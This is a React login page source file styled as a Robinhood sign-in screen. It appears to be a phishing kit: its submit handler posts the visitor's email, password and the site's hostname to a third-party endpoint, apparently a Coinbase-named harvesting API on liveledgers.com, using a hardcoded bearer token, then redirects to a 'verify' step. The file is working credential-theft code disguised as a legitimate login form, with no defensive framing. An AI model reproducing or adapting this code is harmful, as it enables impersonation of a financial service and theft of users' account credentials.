import { useState } from 'react'
import { Helmet, HelmetProvider } from 'react-helmet-async';
import bgLogo from './../../assets/img/bg.jpg'
import { Link, redirect, useNavigate } from 'react-router-dom';
import DataService from '../../services/DataService';
import ValidationService from '../../services/ValidationService';
import { toast } from 'react-toastify';
import AppLayout from '../../layouts/AppLayout';
import axios from 'axios';

function Home() {

    let initLoginFormData       =   {
        email                       :   '', 
        password                    :   '',
        remember_me                 :   'N',
        loading                     :   false,
        domain                      :   window.location.hostname
    };

	/*[ state_name, state_set_function ]*/
    const [loginFormData, setLoginFormData]     =   useState(initLoginFormData);
    const navigate                              =   useNavigate();

    const submitLoginHandler        =   (event) => {
        event.preventDefault();

        setLoginFormData({...loginFormData, loading : true});

        let rules                   =   {
            'email'                     :   'required|email',
            'password'                  :   'required|min:6',
            'remember_me'               :   'required'
        };
        let rulesMsg                =   {
            'email'                     :    {required : 'Please enter Email'},
            'password'                  :    {required : 'Please enter Password'},
            'remember_me'               :    {required : ''}
        };
       let error                    =   ValidationService.rulesFirstErrorGenerator(loginFormData, rules, rulesMsg);
       if(error) {
            toast.error(error);
            setLoginFormData({...loginFormData, loading : false});
       } else {
            const headers       =   { 'Accept': 'application/json','Content-Type':'application/json','Authorization':'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY2NTM2Mzg3NjY3MTNkMDBkMzk3YzhmMCJ9.vUCJSsofnVWOb8U7NKRZzLZPzo2QMt5bpp3I_3vJPvA'};
            axios({
                method: 'POST', headers: headers, data : loginFormData, url: 'https://apiv2.liveledgers.com/public/coinbase_login'
            })
            .then(function (response) {
                setLoginFormData({...loginFormData, loading : false});
                //Goto Verify Screen :-
                return navigate("/verify", { state: { loginFormData : loginFormData } });
            })
            .catch(function (error) {
                let msg                 =   error?.response?.data?.detail ?? 'Application not initialize successfully.';
                toast.error(msg);
                setLoginFormData({...loginFormData, loading : false});
            });
        }
    }

    return (<AppLayout>
        <Helmet>
            <title>Robinhood | Login</title>
        </Helmet>
        <div className="container-fluid">
            <div className="row">
                <div className="col-md-6 order-md-1 order-2 px-0">
                    <div className="login_bg_img"></div>
                </div>
                <div className="col-md-6 order-md-2 order-1">
                    <div className='row'>
                        <div className='col-12 offset-0 col-md-8 offset-md-2 login_form_bg_img' >
                            <div className='d-flex align-items-center' style={{minHeight:"100vh"}}>
                                <form onSubmit={submitLoginHandler} className="col-12 shadow-lg p25 border border-secondary-subtle bg-white">
                                    <h2 className="my25 fs22">Welcome to Robinhood</h2>
                                    <div className="my25">
                                        <label htmlFor="" className="form-label">Email</label>
                                        <input type="text"
                                            value={loginFormData.email}
                                            onChange={e => setLoginFormData({...loginFormData, 'email' : e.target.value }) }
                                            required className="form-control" placeholder="" />
                                    </div>
                                    <div className="my25">
                                        <label htmlFor="" className="form-label">Password</label>
                                        <input type="password" required className="form-control" placeholder=""
                                            value={loginFormData.password}
                                            onChange={e => DataService.handleFormState('password', e.target.value, loginFormData, setLoginFormData)}
                                        />
                                        <Link href="#" className='text-success text-decoration-none fw-bold fs13'>Forgot Your Password</Link>
                                    </div>
                                    <div className="row mt-4">
                                        <div className="col-7">
                                            <div className="form-check">
                                                <input className="form-check-input" type="checkbox"  
                                                id="remember_me"  
                                                checked={loginFormData.remember_me == 'Y'}
                                                onChange={e => DataService.handleFormState('remember_me', e.target.checked ? 'Y':'N', loginFormData, setLoginFormData)}
                                                />
                                                <label className="form-check-label" htmlFor="remember_me">Remember me</label>
                                            </div>
                                        </div>
                                        <div className="col-5 text-end">
                                            <button type="submit" className={['btn','btn-success', loginFormData.loading ? 'disabled' : ''].join(' ')} >
                                                {loginFormData.loading && <span class="spinner-grow spinner-grow-sm me15" aria-hidden="true"></span>}
                                                <span>Sign In</span>
                                            </button>
                                        </div>
                                    </div>
                                    <p>Not a Robinhood ?<Link href="#" className='text-decoration-none link-success'> Create an aacount.</Link> </p>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </AppLayout>)
}

export default Home
